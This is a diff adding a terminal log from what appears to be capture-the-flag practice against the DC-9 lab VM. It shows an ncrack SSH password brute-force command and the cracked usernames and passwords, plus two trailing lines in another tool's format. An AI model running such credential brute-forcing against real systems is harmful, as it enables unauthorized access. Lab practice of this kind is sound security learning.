@@ -1,0 +1,23 @@
+┌──(kali㉿kali)-[~/CTF/JvP-prep/sql-inject-LFI/DC-9]
+└─$ ncrack -v -U usernames -P passwords ssh://10.0.2.4           1 ⨯
+
+Starting Ncrack 0.7 ( http://ncrack.org ) at 2021-07-14 17:09 EDT
+
+Discovered credentials on ssh://10.0.2.4:22 'chandlerb' 'UrAG0D!'
+Discovered credentials on ssh://10.0.2.4:22 'joeyt' 'Passw0rd'
+Discovered credentials on ssh://10.0.2.4:22 'janitor' 'Ilovepeepee'
+ssh://10.0.2.4:22 finished.
+
+Discovered credentials for ssh on 10.0.2.4 22/tcp:
+10.0.2.4 22/tcp ssh: 'chandlerb' 'UrAG0D!'
+10.0.2.4 22/tcp ssh: 'joeyt' 'Passw0rd'
+10.0.2.4 22/tcp ssh: 'janitor' 'Ilovepeepee'
+
+Ncrack done: 1 service scanned in 93.02 seconds.
+Probes sent: 217 | timed-out: 0 | prematurely-closed: 203
+
+Ncrack finished.
+
+ACCOUNT FOUND: [ssh] Host: 10.0.2.4 User: fredf Password: B4-Tru3-001 [SUCCESS]
+ACCOUNT FOUND: [ssh] Host: 10.0.2.4 User: joeyt Password: Passw0rd [SUCCESS]
+                                                                                                                                    
